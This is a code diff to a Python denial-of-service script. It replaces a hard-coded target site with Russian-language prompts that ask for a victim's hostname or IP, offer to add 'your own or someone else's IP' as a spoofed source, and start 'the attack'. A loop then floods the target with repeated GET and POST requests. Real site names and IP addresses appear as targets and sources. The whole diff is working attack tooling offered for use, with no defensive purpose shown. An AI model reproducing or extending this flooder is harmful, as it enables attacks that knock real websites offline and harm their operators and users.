@@ -4,9 +4,22 @@ from random import choice
 import requests
 import socket
 
-
-target = socket.gethostbyname("m.bibika.ru")
+#http://suvenir.segment.ru/
 ips = ['217.160.0.137', '212.164.222.45']
+
+if input('Вы уже знаете IP адрес сайта, или вам нужно его найти? (y/n) ') == 'n':
+    url = input('Введите адрес сайта(без https:// и http://): ')
+    target = socket.gethostbyname(url)
+else:
+    target = input('Введите IP сайта: ')
+
+if input('Вы хотите ввести свой или чужой IP для DDoS с него? (y/n) ') == 'y':
+    user_ip = input('Введите IP: ')
+    ips.append(user_ip)
+
+target2 = input('Введите адрес сайта(с https:// или http://): ')
+input('Enter для начала атаки')
+
 port = 80
 attack_num = 0
 
@@ -14,8 +27,8 @@ attack_num = 0
 def dos():
     while True:
         try:
-            requests.get("http://m.bibika.ru/")
-            requests.post("http://m.bibika.ru/")
+            requests.get(target2)
+            requests.post(target2)
 
             global attack_num
             attack_num += 1
